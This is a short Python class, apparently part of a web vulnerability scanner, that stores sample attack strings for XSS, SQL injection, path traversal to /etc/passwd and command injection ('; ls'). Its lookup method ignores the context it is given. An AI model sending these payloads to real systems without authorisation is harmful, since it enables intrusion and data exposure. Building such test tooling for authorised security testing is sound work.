class PayloadArsenal:
    def __init__(self):
        self.payloads = {
            'xss': [{'payload': '<script>alert(1)</script>', 'type': 'xss'}],
            'sqli': [{'payload': "' OR '1'='1", 'type': 'sqli'}],
            'lfi': [{'payload': '../../../../etc/passwd', 'type': 'lfi'}],
            'cmd_injection': [{'payload': '; ls', 'type': 'cmd_injection'}]
        }
    
    def get_payloads_by_context(self, context):
        all_payloads = []
        for category in self.payloads.values():
            all_payloads.extend(category)
        return all_payloads
